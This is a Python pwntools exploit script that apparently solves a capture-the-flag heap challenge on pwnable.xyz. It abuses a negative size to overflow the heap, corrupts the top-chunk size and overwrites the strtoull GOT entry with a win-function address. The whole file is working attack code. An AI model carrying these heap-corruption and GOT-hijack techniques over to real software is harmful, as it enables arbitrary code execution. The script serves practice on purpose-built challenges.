from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30041)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def add(size,note,title="A"*0x20):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(size))
	print(target.recvuntil(": "))
	target.send(title)
	print(target.recvuntil(": "))
	target.send(note)
	
def edit(index,data):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(str(index))
	print(target.recvuntil(": "))
	target.send(data)
	
def leak():
	init(3)
	print(target.recvline())
	leaks=target.recvuntil(":").strip(":")
	return u64(leaks.ljust(8,"\x00"))
	
win=0x4008A2
add(-0x10,"")
add(0x30,"A"*0x30)
chunkarray=0x6012a0
edit(0,p64(0)+p64(0x31)+"A"*0x20+p64(0)+p64(0x51)+p64(0xffffffff)+p64(chunkarray))
leaks=leak()
print(hex(leaks))
topchunk=leaks+0xd0+0x50
strtoull_got=0x601240
add(-0x10,"")
edit(2,p64(0)+p64(0x31)+"A"*0x20+p64(0)+p64(0xffffffffffffffff)+"\n")
add(strtoull_got-topchunk-0x10,"",p64(win)*4)
init(1)
print(target.recvuntil(": "))
target.sendline(str(1))


target.interactive()
